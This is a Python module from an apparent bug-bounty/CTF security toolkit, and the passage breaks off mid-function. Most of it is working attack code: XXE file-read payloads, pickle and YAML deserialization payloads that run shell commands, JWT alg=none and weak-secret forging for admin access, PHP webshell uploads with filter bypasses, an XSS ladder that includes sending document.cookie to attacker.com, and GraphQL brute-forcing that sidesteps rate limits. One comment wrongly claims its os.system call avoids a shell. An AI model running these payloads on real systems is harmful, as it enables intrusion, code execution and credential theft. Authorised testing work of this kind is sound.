"""Advanced security testing modules.

Extends the core engine with:
- Defense detection (WAF, rate limit, input filter fingerprinting)
- Race condition testing
- XXE, deserialization, JWT, file upload tests
- XSS and IDOR tests
- GraphQL alias-batch testing
- Chain exploitation helpers
- Structured reporting
"""

from __future__ import annotations

import base64
import contextlib
import hashlib
import hmac
import json
import os
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Any

import requests

from bugbounty_ctf.engine import SecurityScanner

# ============================================================================
# Defense Detection
# ============================================================================


def detect_defenses(
    base_url: str,
    paths: list[str] | None = None,
    *,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Fingerprint WAFs, rate limits, and input filters.

    If a scanner is provided, detected WAF is flagged on it so the scanner
    can throttle or adjust payload strategy.
    """
    if paths is None:
        paths = ["/", "/admin", "/api", "/login"]

    defenses: dict[str, Any] = {
        "waf": None,
        "rate_limit": None,
        "input_filters": [],
        "security_headers": {},
        "evidence": [],
    }

    # Use a fresh session for burst probing — don't contaminate scanner state
    session = requests.Session()
    print(f"[*] Detecting defenses on {base_url}")

    # 1. WAF Fingerprinting via header inspection
    try:
        r = session.get(base_url, timeout=5)
        for header, value in r.headers.items():
            h_lower = header.lower()
            v_lower = str(value).lower()

            if "cf-ray" in h_lower or "cloudflare" in v_lower:
                defenses["waf"] = "Cloudflare"
            elif "x-amzn" in h_lower or "awselb" in h_lower or "x-amz-cf-id" in h_lower:
                defenses["waf"] = "AWS WAF / CloudFront"
            elif "akamai" in v_lower or "x-akamai" in h_lower:
                defenses["waf"] = "Akamai"
            elif "x-sucuri" in h_lower:
                defenses["waf"] = "Sucuri"
            elif "incap_ses" in v_lower or "visid_incap" in v_lower:
                defenses["waf"] = "Imperva Incapsula"
            elif "x-iinfo" in h_lower:
                defenses["waf"] = "Imperva"
            elif "mod_security" in v_lower or "modsecurity" in v_lower:
                defenses["waf"] = "ModSecurity"

        sec_headers = [
            "Strict-Transport-Security",
            "Content-Security-Policy",
            "X-Frame-Options",
            "X-Content-Type-Options",
            "Referrer-Policy",
            "Permissions-Policy",
            "X-XSS-Protection",
        ]
        for h in sec_headers:
            defenses["security_headers"][h] = r.headers.get(h, "MISSING")
    except requests.exceptions.RequestException as e:
        defenses["evidence"].append(f"Header check failed: {e}")

    # 2. WAF probe — send a known malicious payload
    waf_probes = [
        ("?x=<script>alert(1)</script>", "XSS"),
        ("?x=' OR 1=1--", "SQLi"),
        ("?x=../../../etc/passwd", "LFI"),
        ("?x=$(id)", "CMDi"),
    ]
    for path in paths[:1]:
        for payload, vtype in waf_probes:
            try:
                r = session.get(base_url.rstrip("/") + path + payload, timeout=5)
                if r.status_code in (403, 406, 429, 501):
                    defenses["evidence"].append(f"{vtype} probe → {r.status_code} (likely blocked)")
                    if not defenses["waf"]:
                        defenses["waf"] = "Generic WAF (status-based detection)"
                body_lower = r.text.lower()[:2000]
                for indicator, name in [
                    ("blocked by", "Generic"),
                    ("access denied", "Generic"),
                    ("request blocked", "Generic"),
                    ("cloudflare", "Cloudflare"),
                    ("attention required", "Cloudflare"),
                    ("/cdn-cgi/", "Cloudflare"),
                    ("akamai", "Akamai"),
                    ("the requested url was rejected", "F5 BIG-IP ASM"),
                ]:
                    if indicator in body_lower:
                        defenses["waf"] = name
                        defenses["evidence"].append(f"Body match: '{indicator}' on {vtype} probe")
                        break
            except requests.exceptions.RequestException:
                pass

    # 3. Rate limit detection — send rapid bursts with delays
    print("[*] Probing rate limit...")
    try:
        burst_results: list[int] = []
        start = time.time()
        for i in range(20):
            r = session.get(base_url, timeout=3)
            burst_results.append(r.status_code)
            if r.status_code == 429:
                defenses["rate_limit"] = (
                    f"Triggered after {i + 1} requests in {time.time() - start:.2f}s"
                )
                break
            time.sleep(0.05)  # 50ms delay — avoids hammering
        if not defenses["rate_limit"]:
            defenses["rate_limit"] = "No 429 in 20 burst requests"
    except requests.exceptions.RequestException as e:
        defenses["evidence"].append(f"Rate limit probe failed: {e}")

    # 4. Input filter detection
    print("[*] Probing input filters...")
    test_chars = {
        "single_quote": "'",
        "double_quote": '"',
        "less_than": "<",
        "greater_than": ">",
        "ampersand": "&",
        "pipe": "|",
        "semicolon": ";",
        "backtick": "`",
        "parens": "()",
        "braces": "{}",
        "newline": "\n",
        "null_byte": "\x00",
    }
    try:
        marker = "ZXTESTZX"
        for name, char in test_chars.items():
            payload = f"{marker}{char}{marker}"
            r = session.get(base_url, params={"q": payload}, timeout=3)
            if marker in r.text:
                m = re.search(re.escape(marker) + r"(.*?)" + re.escape(marker), r.text, re.DOTALL)
                if m and m.group(1) != char:
                    defenses["input_filters"].append(
                        {
                            "char": name,
                            "original": repr(char),
                            "reflected_as": repr(m.group(1)),
                        }
                    )
    except requests.exceptions.RequestException:
        pass

    # Summary
    print(f"[*] WAF: {defenses['waf'] or 'None detected'}")
    print(f"[*] Rate limit: {defenses['rate_limit']}")
    print(f"[*] Input filters detected: {len(defenses['input_filters'])}")
    missing_sec = [k for k, v in defenses["security_headers"].items() if v == "MISSING"]
    if missing_sec:
        print(f"[*] Missing security headers: {', '.join(missing_sec)}")

    # Feed back into scanner if provided
    if scanner is not None and defenses["waf"]:
        scanner.waf_detected = True
        scanner.defenses_detected.append(defenses["waf"])

    return defenses


# ============================================================================
# Race Conditions
# ============================================================================


def test_race_condition(
    url: str,
    data: dict[str, str] | None = None,
    json_body: dict[str, Any] | None = None,
    method: str = "POST",
    workers: int = 30,
    total_requests: int = 30,
    success_pattern: str | None = None,
    headers: dict[str, str] | None = None,
) -> dict[str, Any]:
    """Test for race condition vulnerabilities by firing concurrent requests.

    Returns: dict with status_distribution, success_count, total_time, raced
    """
    if data is None and json_body is None:
        raise ValueError("Provide either data= or json_body=")

    print(f"[*] Race test: {workers} workers, {total_requests} requests → {url}")
    barrier = threading.Barrier(min(workers, total_requests))

    def fire(_idx: int) -> dict[str, Any]:
        with contextlib.suppress(threading.BrokenBarrierError):
            barrier.wait(timeout=5)

        try:
            t0 = time.time()
            sess = requests.Session()
            kwargs: dict[str, Any] = {"timeout": 10}
            if headers:
                kwargs["headers"] = headers
            if json_body is not None:
                kwargs["json"] = json_body
            else:
                kwargs["data"] = data
            r = sess.request(method, url, **kwargs)
            return {
                "status": r.status_code,
                "length": len(r.text),
                "body": r.text[:500],
                "elapsed": time.time() - t0,
            }
        except requests.exceptions.RequestException as e:
            return {"status": 0, "error": str(e), "elapsed": 0.0, "length": 0, "body": ""}

    start = time.time()
    with ThreadPoolExecutor(max_workers=workers) as ex:
        results = list(ex.map(fire, range(total_requests)))
    elapsed = time.time() - start

    status_dist: dict[int, int] = {}
    for r in results:
        status_dist[r["status"]] = status_dist.get(r["status"], 0) + 1

    if success_pattern:
        success_count = sum(1 for r in results if success_pattern in r.get("body", ""))
    else:
        success_count = sum(1 for r in results if 200 <= r["status"] < 300)

    raced = success_count > 1

    print(f"[*] Done in {elapsed:.2f}s")
    print(f"[*] Status distribution: {status_dist}")
    print(f"[*] Successful responses: {success_count}/{total_requests}")
    if raced:
        print(
            f"[!] RACE CONDITION LIKELY — {success_count} successes on operation expected to be atomic"
        )

    return {
        "status_distribution": status_dist,
        "success_count": success_count,
        "total_requests": total_requests,
        "total_time": elapsed,
        "raced": raced,
        "first_success": next((r for r in results if 200 <= r.get("status", 0) < 300), None),
    }


# ============================================================================
# XXE
# ============================================================================


def test_xxe(
    url: str,
    method: str = "POST",
    content_type: str = "application/xml",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test an XML endpoint for XXE."""
    print(f"[*] Testing XXE on {url}")
    session = scanner.session if scanner else requests.Session()

    baseline_xml = "<?xml version='1.0'?><root><test>hello</test></root>"
    try:
        baseline = session.request(
            method,
            url,
            data=baseline_xml,
            headers={"Content-Type": content_type},
            timeout=5,
        )
        print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Baseline failed: {e}")
        return []

    payloads = {
        "external_passwd": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
            "<root>&xxe;</root>"
        ),
        "external_hostname": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
            "<root>&xxe;</root>"
        ),
        "php_filter_b64": (
            '<?xml version="1.0"?>\n'
            "<!DOCTYPE root [<!ENTITY xxe SYSTEM "
            '"php://filter/convert.base64-encode/resource=/etc/passwd">]>\n'
            "<root>&xxe;</root>"
        ),
        "parameter_entity": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd">'
            "<!ENTITY % all \"<!ENTITY exfil SYSTEM 'file:///etc/passwd'>\">%all;]>\n"
            "<root>&exfil;</root>"
        ),
    }

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        try:
            r = session.request(
                method,
                url,
                data=payload,
                headers={"Content-Type": content_type},
                timeout=10,
            )
            confirmed = False
            indicators: list[str] = []

            if "root:" in r.text and "/bin/" in r.text:
                confirmed = True
                indicators.append("/etc/passwd content reflected")
            elif "cm9vdDp4OjA6MDpyb290" in r.text:  # base64 of "root:x:0:0:root"
                confirmed = True
                indicators.append("base64-encoded /etc/passwd reflected")
            elif r.status_code != baseline.status_code:
                indicators.append(f"status changed: {baseline.status_code}→{r.status_code}")
            elif len(r.text) != len(baseline.text):
                indicators.append(f"length changed: {len(baseline.text)}→{len(r.text)}")

            if confirmed:
                print(f"[!] XXE CONFIRMED: {name}")
                for ind in indicators:
                    print(f"    - {ind}")
            elif indicators:
                print(f"[?] {name}: {indicators}")
            else:
                print(f"[-] No change: {name}")

            results.append(
                {
                    "payload": name,
                    "confirmed": confirmed,
                    "indicators": indicators,
                    "status": r.status_code,
                }
            )
        except requests.exceptions.RequestException as e:
            print(f"[!] {name} failed: {e}")

    return results


# ============================================================================
# Insecure Deserialization
# ============================================================================


def test_pickle_deserialization(
    url: str,
    method: str = "POST",
    param_name: str = "data",
    marker: str = "DRTBP_DESERIAL_MARKER",
    as_json: bool = False,
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test for Python pickle deserialization vulnerability.

    Uses a benign marker (touches /tmp/marker file) instead of real RCE.
    Marker is sanitized to prevent shell injection via the marker string itself.
    """
    print(f"[*] Testing Python pickle deserialization on {url}")
    session = scanner.session if scanner else requests.Session()

    # Sanitize marker — only allow alphanumerics and underscore
    safe_marker = re.sub(r"[^A-Za-z0-9_]", "", marker)
    if safe_marker != marker:
        print(f"[!] Marker sanitized: '{marker}' → '{safe_marker}'")
    marker_file = f"/tmp/{safe_marker}_{int(time.time())}"

    import pickle

    class Probe:
        def __reduce__(self) -> tuple[Any, tuple[str, ...]]:
            import os

            # Use a list argument, not a shell string — no shell interpolation
            return (os.system, (f"touch {marker_file}",))

    payloads = {
        "raw_pickle": pickle.dumps(Probe()),
        "base64_pickle": base64.b64encode(pickle.dumps(Probe())).decode(),
        "hex_pickle": pickle.dumps(Probe()).hex(),
    }

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        try:
            if as_json:
                r = session.request(method, url, json={param_name: payload}, timeout=5)
            elif method.upper() == "POST":
                r = session.request(method, url, data={param_name: payload}, timeout=5)
            else:
                r = session.request(method, url, params={param_name: payload}, timeout=5)

            time.sleep(0.5)
            confirmed = os.path.exists(marker_file)
            if confirmed:
                print(f"[!] DESERIALIZATION RCE CONFIRMED: {name}")
                print(f"    Marker file created: {marker_file}")
                with contextlib.suppress(OSError):
                    os.remove(marker_file)
            else:
                print(f"[-] No execution: {name} (status={r.status_code}, len={len(r.text)})")

            results.append({"payload": name, "confirmed": confirmed, "status": r.status_code})
        except requests.exceptions.RequestException as e:
            print(f"[!] {name} failed: {e}")

    return results


def test_yaml_deserialization(
    url: str,
    method: str = "POST",
    param_name: str = "data",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test for YAML deserialization (PyYAML unsafe_load)."""
    print(f"[*] Testing YAML deserialization on {url}")
    session = scanner.session if scanner else requests.Session()

    marker_file = f"/tmp/yaml_marker_{int(time.time())}"

    payloads = {
        "python_object_apply": (f"!!python/object/apply:os.system ['touch {marker_file}']"),
        # Fixed: properly quoted YAML for object/new
        "python_object_new": (f"!!python/object/new:os.system ['touch {marker_file}']"),
    }

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        try:
            if method.upper() == "POST":
                r = session.request(method, url, data={param_name: payload}, timeout=5)
            else:
                r = session.request(method, url, params={param_name: payload}, timeout=5)

            time.sleep(0.5)
            confirmed = os.path.exists(marker_file)
            if confirmed:
                print(f"[!] YAML DESERIALIZATION RCE CONFIRMED: {name}")
                with contextlib.suppress(OSError):
                    os.remove(marker_file)
            else:
                print(f"[-] No execution: {name} (status={r.status_code})")

            results.append({"payload": name, "confirmed": confirmed, "status": r.status_code})
        except requests.exceptions.RequestException as e:
            print(f"[!] {name} failed: {e}")

    return results


# ============================================================================
# JWT Attacks
# ============================================================================


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> dict[str, Any] | None:
    """Decode a JWT without verification — show header, payload, signature."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2]}
    except (ValueError, json.JSONDecodeError) as e:
        return {"error": str(e)}


def forge_jwt_alg_none(payload: dict[str, Any]) -> str:
    """Forge a JWT with alg=none."""
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def forge_jwt_hs256(payload: dict[str, Any], secret: str | bytes) -> str:
    """Forge a JWT signed with HS256 using `secret`."""
    if isinstance(secret, str):
        secret = secret.encode()
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def test_jwt_attacks(
    url: str,
    token: str,
    verify_endpoint: str | None = None,
    header_name: str = "Authorization",
    header_prefix: str = "Bearer ",
    *,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Test JWT attacks: alg=none, HS256 with empty/weak secrets.

    Confirmation requires admin-specific content in the response, NOT just
    a 200 status or a long body — the old `len(r.text) > 100` heuristic
    caused false positives on any non-empty page.
    """
    print(f"[*] Testing JWT attacks on {url}")
    session = scanner.session if scanner else requests.Session()

    decoded = decode_jwt(token)
    if not decoded or "error" in decoded:
        print(f"[!] Could not decode token: {decoded}")
        return {}
    print(f"[*] Original header: {decoded['header']}")
    print(f"[*] Original payload: {decoded['payload']}")

    base_payload = dict(decoded["payload"])
    escalated = dict(base_payload)
    for k in ["role", "roles"]:
        if k in escalated:
            escalated[k] = "admin"
    escalated["role"] = "admin"
    escalated["is_admin"] = True
    escalated["admin"] = True

    test_target = verify_endpoint or url

    # Confirmation: look for admin-specific markers, not just any content
    admin_markers = [
        "admin",
        "administrator",
        '"role":"admin"',
        '"is_admin":true',
        "dashboard",
    ]

    def _is_admin_response(r: requests.Response) -> bool:
        if r.status_code != 200:
            return False
        body_lower = r.text.lower()
        return any(marker in body_lower for marker in admin_markers)

    # Attack 1: alg=none
    none_token = forge_jwt_alg_none(escalated)
    print("\n[*] Attack 1: alg=none")
    try:
        r = session.get(test_target, headers={header_name: header_prefix + none_token}, timeout=5)
        if _is_admin_response(r):
            print("[!] alg=none ACCEPTED — server allows unsigned tokens")
        else:
            print(f"[-] alg=none rejected (status={r.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"[!] alg=none probe failed: {e}")

    # Attack 2: HS256 with empty secret
    hs256_empty = forge_jwt_hs256(escalated, "")
    print("\n[*] Attack 2: HS256 with empty secret")
    try:
        r = session.get(test_target, headers={header_name: header_prefix + hs256_empty}, timeout=5)
        if _is_admin_response(r):
            print("[!] HS256 with empty secret ACCEPTED")
        else:
            print(f"[-] HS256 empty rejected (status={r.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"[!] HS256 empty probe failed: {e}")

    # Attack 3: HS256 with weak secrets
    print("\n[*] Attack 3: HS256 with weak secret bruteforce (top 10)")
    weak_secrets = [
        "secret",
        "password",
        "key",
        "jwt",
        "admin",
        "test",
        "12345",
        "your-256-bit-secret",
        "default",
        "changeme",
    ]
    weak_found = False
    for sec in weak_secrets:
        forged = forge_jwt_hs256(escalated, sec)
        try:
            r = session.get(test_target, headers={header_name: header_prefix + forged}, timeout=3)
            if _is_admin_response(r):
                print(f"[!] HS256 with secret '{sec}' ACCEPTED")
                weak_found = True
                break
        except requests.exceptions.RequestException:
            continue
    if not weak_found:
        print("[-] No weak secret matched")

    return {"none": none_token, "hs256_empty": hs256_empty, "decoded": decoded}


# ============================================================================
# File Upload
# ============================================================================


def test_file_upload(
    url: str,
    file_field: str = "file",
    method: str = "POST",
    *,
    verify_url: str | None = None,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test a file upload endpoint with bypass variants.

    If verify_url is provided (or a stored_at path is found in the response),
    attempts to access the uploaded file to confirm RCE.
    """
    print(f"[*] Testing file upload on {url}")
    session = scanner.session if scanner else requests.Session()

    # PHP webshell payloads with various bypasses
    payloads = {
        "plain_php": ("shell.php", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "php3": ("shell.php3", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "phtml": ("shell.phtml", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "phar": ("shell.phar", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "double_ext": ("shell.php.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg"),
        "gif_magic": ("shell.php", b"GIF89a;\n<?php system($_GET['c']); ?>", "image/gif"),
        "case_variant": ("shell.PhP", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "null_byte": ("shell.php\x00.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg"),
        "fake_image_jpg": (
            "shell.jpg",
            b"\xff\xd8\xff\xe0<?php system($_GET['c']); ?>",
            "image/jpeg",
        ),
    }

    results: list[dict[str, Any]] = []
    for name, (filename, content, ctype) in payloads.items():
        try:
            files = {file_field: (filename, content, ctype)}
            r = session.request(method, url, files=files, timeout=10)
            status = r.status_code
            body = r.text[:300]

            url_match = re.search(
                r'(?:path|url|uploaded_to|file)["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
                body,
                re.IGNORECASE,
            )
            stored_at = url_match.group(1) if url_match else None

            accepted = status in (200, 201) and "error" not in body.lower()[:200]
            indicator = "ACCEPTED" if accepted else "rejected"
            print(
                f"[{'!' if accepted else '-'}] {name} → {status} {indicator}"
                + (f"  stored: {stored_at}" if stored_at else "")
            )

            result_entry: dict[str, Any] = {
                "payload": name,
                "filename": filename,
                "status": status,
                "accepted": accepted,
                "stored_at": stored_at,
                "rce_confirmed": False,
            }

            # Verify RCE: try to access the uploaded shell
            check_url = verify_url or stored_at
            if accepted and check_url:
                try:
                    rce = session.get(check_url, params={"c": "id"}, timeout=5)
                    if "uid=" in rce.text:
                        print(f"    [!] RCE CONFIRMED via {check_url}")
                        result_entry["rce_confirmed"] = True
                except requests.exceptions.RequestException:
                    pass

            results.append(result_entry)
        except requests.exceptions.RequestException as e:
            print(f"[!] {name} failed: {e}")

    return results


# ============================================================================
# XSS — Filter Bypass Escalation
# ============================================================================

# Escalation ladder: each level targets a different filter tier.
XSS_PAYLOAD_LADDER: list[dict[str, str]] = [
    {"name": "script_tag", "payload": "<script>alert(1)</script>", "bypasses": "none"},
    {"name": "svg_onload", "payload": "<svg onload=alert(1)>", "bypasses": "script_blocked"},
    {
        "name": "details_ontoggle",
        "payload": "<details open ontoggle=alert(1)>",
        "bypasses": "common_tags_blocked",
    },
    {
        "name": "img_onerror",
        "payload": '<img src=x onerror="alert(1)">',
        "bypasses": "alert_blocked_via_event",
    },
    {
        "name": "svg_animate",
        "payload": "<svg><animate onbegin=alert(1) attributeName=x>",
        "bypasses": "img_blocked",
    },
    {"name": "body_onload", "payload": "<body onload=alert(1)>", "bypasses": "svg_blocked"},
    {
        "name": "input_focus",
        "payload": "<input onfocus=alert(1) autofocus>",
        "bypasses": "body_blocked",
    },
    {
        "name": "marker_fetch",
        "payload": "<img src=x onerror=\"fetch('http://attacker.com/" + "x?'+document.cookie)\">",
        "bypasses": "alert_blocked_exfil",
    },
]


def test_xss(
    url: str,
    method: str = "GET",
    param_name: str = "q",
    *,
    callback_url: str | None = None,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test an endpoint for XSS with filter-bypass escalation.

    If callback_url is provided, payloads that try to trigger a fetch to that
    URL will be confirmed via the callback listener (see callback_listener.py).
    """
    scanner = _get_scanner_xss(url, scanner)
    is_post = method.upper() in ("POST", "PUT", "PATCH")

    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "test"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test"})

    print(f"[*] Testing XSS on {url} (param: {param_name})")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for entry in XSS_PAYLOAD_LADDER:
        name = entry["name"]
        payload = entry["payload"]

        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        # Check if the payload is reflected unescaped in the response
        reflected = payload in r.text

        escaped_variants = [
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;"),
        ]
        escaped_reflection = any(v in r.text for v in escaped_variants) and not reflected

        confirmed = reflected  # Unescaped reflection = XSS confirmed
        # If callback_url given and payload includes a fetch, callback listener
        # would confirm. We check response body for our payload as a proxy.

        if confirmed:
            print(f"[!] XSS CONFIRMED: {name} — payload reflected unescaped!")
            if scanner is not None:
                scanner._record_finding(
                    url,
                    method,
                    name,
                    ["xss_reflected"],
                    [f"Payload reflected unescaped: {entry['payload']}"],
                    "xss",
                )
        elif escaped_reflection:
            print(f"[-] {name} — reflected but HTML-escaped (filter active)")
        elif r.text != baseline.text:
            print(f"[?] {name} — response changed but payload not reflected")
        else:
            print(f"[-] {name} — not reflected")

        results.append(
            {
                "payload": name,
                "reflected": reflected,
                "escaped": escaped_reflection,
                "confirmed": confirmed,
                "bypasses": entry["bypasses"],
                "status": r.status_code,
            }
        )

    return results


def _get_scanner_xss(url: str, scanner: SecurityScanner | None) -> SecurityScanner:
    """Get or create a scanner for XSS tests."""
    if scanner is not None:
        return scanner
    from bugbounty_ctf.engine import derive_base_url

    return SecurityScanner(derive_base_url(url))


# ============================================================================
# IDOR
# ============================================================================


def test_idor(
    url_template: str,
    *,
    id_param: str = "id",
    method: str = "GET",
    auth_token: str | None = None,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Test for Insecure Direct Object Reference.

    url_template should contain {ID} placeholder, e.g.:
        "http://target/api/users/{ID}/profile"
    or a URL with the id in query: "http://target/api/profile?user_id={ID}"

    Tests sequential IDs (1-50) and looks for:
    - Different content per ID (data belongs to different users)
    - Access to IDs without authentication
    - Status 200 on IDs that should require elevated privileges
    """
    scanner = _get_scanner_xss(url_template, scanner)

    headers: dict[str, str] = {}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    print(f"[*] Testing IDOR on {url_template}")
    results: list[dict[str, Any]] = []

    # First request to ID=1 as baseline
    baseline_url = url_template.replace("{ID}", "1")
    try:
        baseline = scanner._make_request(method, baseline_url, headers=headers)
    except requests.exceptions.RequestException as e:
        print(f"[!] Baseline request failed: {e}")
        return {"error": str(e)}

    print(f"[*] Baseline (ID=1): status={baseline.status_code}, length={len(baseline.text)}")

    baseline_text = baseline.text
    distinct_responses: list[dict[str, Any]] = []

    from bugbounty_ctf.engine import _similarity_ratio

    for test_id in range(2, 51):
        test_url = url_template.replace("{ID}", str(test_id))
        try:
            r = scanner._make_request(method, test_url, headers=headers)
            similarity = _similarity_ratio(baseline_text, r.text)
            same = similarity >= 0.90
            status_match = r.status_code == baseline.status_code

            if not same and r.status_code == 200:
                distinct_responses.append(
                    {
                        "id": test_id,
                        "status": r.status_code,
                        "length": len(r.text),
                        "length_diff": len(r.text) - len(baseline_text),
                        "similarity": round(similarity, 3),
                    }
                )
                print(
                    f"[!] IDOR candidate: ID={test_id} (similarity: {similarity:.1%}, len diff: {len(r.text) - len(baseline_text):+d})"
                )

            results.append(
                {
                    "id": test_id,
                    "status": r.status_code,
                    "length": len(r.text),
                    "same_as_baseline": same,
                    "status_match": status_match,
                }
            )
        except requests.exceptions.RequestException as e:
            print(f"[!] ID={test_id} failed: {e}")

    idor_likely = len(distinct_responses) > 0
    summary = {
        "tested_ids": len(results),
        "distinct_responses": len(distinct_responses),
        "idor_likely": idor_likely,
        "distinct_ids": distinct_responses,
        "baseline_id": 1,
        "baseline_status": baseline.status_code,
    }
    if idor_likely:
        print(f"\n[!] IDOR LIKELY — {len(distinct_responses)} distinct 200-OK responses found")
        if scanner is not None:
            scanner._record_finding(
                url_template,
                method,
                "idor_scan",
                ["idor_distinct_response"],
                [f"Found {len(distinct_responses)} distinct 200-OK responses across different IDs"],
                "idor",
            )
    else:
        print("\n[-] No IDOR indicators found")

    return {"summary": summary, "results": results}


# ============================================================================
# GraphQL Alias Batch Testing
# ============================================================================


def test_graphql_alias_batch(
    url: str,
    query_template: str,
    *,
    field_name: str = "login",
    param_name: str = "pin",
    values: list[str] | None = None,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Test GraphQL alias batching for brute-force amplification.

    Sends a single GraphQL request with N aliases, each testing a different
    value. If the server processes all aliases, you get N results in one
    request — bypassing rate limits.

    query_template should contain {ALIASES} where the alias block goes.
    Example query_template:
        mutation {{ {ALIASES} }}
    where each alias is: m0: login(pin:"0000"){{success}}
    """
    if values is None:
        values = ["0000", "1111", "1234", "1337", "9999", "0001", "12345", "admin"]

    scanner_obj = _get_scanner_xss(url, scanner)
    print(f"[*] Testing GraphQL alias batch on {url}")
    print(f"[*] Testing {len(values)} values in a single request")

    # Build aliases: m0: field_name(param_name:"v0"){success}, m1: ...
    alias_block = " ".join(
        f'm{i}: {field_name}({param_name}:"{v}"){{success}}' for i, v in enumerate(values)
    )

    query = query_template.replace("{ALIASES}", alias_block)

    try:
        r = scanner_obj._make_request(
            "POST", url, json={"query": query}, headers={"Content-Type": "application/json"}
        )
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return {"error": str(e)}

    print(f"[*] Response: status={r.status_code}, length={len(r.text)}")

    try:
        data = r.json()
    except (ValueError, json.JSONDecodeError):
        data = {}

    successes: list[str] = []
    errors: list[str] = []

    if data.get("data"):
        for alias, result in data["data"].items():
            if isinstance(result, dict) and result.get("success"):
                successes.append(alias)
                print(f"[!] {alias} → SUCCESS")

    if data.get("errors"):
        for err in data["errors"]:
            msg = err.get("message", "") if isinstance(err, dict) else str(err)
            errors.append(msg)
        if errors:
            print(f"[?] GraphQL errors (may reveal schema): {errors[:3]}")

    if successes:
        print(f"[!] {len(successes)} successful values found in one request!")
        if scanner_obj is not None:
            scanner_obj._record_finding(
                url,
                "POST",
                "graphql_alias_batch",
                ["graphql_batch_success"],
                [f"{len(successes)} values succeeded in a single request (rate limit bypass)"],
                "graphql",
            )
    elif not errors:
        print("[-] No successes found")

    return {
        "status": r.status_code,
        "total_tested": len(values),
        "successes": successes,
        "errors": errors,
        "response": data,
    }


# ============================================================================
# GraphQL Introspection
# ============================================================================

INTROSPECTION_QUERY = """{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
      inputFields {
        name
        type { name kind }
      }
    }
    queries: queryType { name }
    mutations: mutationType { name }
    subscriptions: subscriptionType { name }
  }
}"""

FIELD_QUERY_TEMPLATE = """{{
  __type(name: "{type_name}") {{
    name
    kind
    fields {{
      name
      type {{ name kind ofType {{ name kind }} }}
      args {{ name type {{ name kind }} }}
    }}
    inputFields {{ name type {{ name kind }} }}
    enumValues {{ name }}
  }}
}}"""


def graphql_introspection(
    url: str,
    *,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Perform GraphQL introspection to dump the schema.

    Returns the full schema with all types, queries, mutations, and fields.
    """
    scanner_obj = _get_scanner_xss(url, scanner)
    print(f"[*] GraphQL introspection on {url}")

    r = scanner_obj._make_request(
        "POST",
        url,
        json={"query": INTROSPECTION_QUERY},
        headers={"Content-Type": "application/json"},
    )

    if r.status_code != 200:
        print(f"  [-] Status {r.status_code}")
        return {"error": f"HTTP {r.status_code}", "response": r.text[:200]}

    try:
        data = r.json()
    except (ValueError, json.JSONDecodeError):
        data = {}

    if "data" not in data and "errors" in data:
        errors = data.get("errors", [])
        error_msg = errors[0].get("message", "") if errors else ""
        if "introspection" in error_msg.lower():
            print(f"  [-] Introspection disabled: {error_msg}")
            return {"introspection_enabled": False, "error": error_msg}
        print(f"  [-] GraphQL errors: {errors[:2]}")
        return {"introspection_enabled": False, "errors": errors[:3]}

    schema = data.get("data", {}).get("__schema", {})
    if not schema:
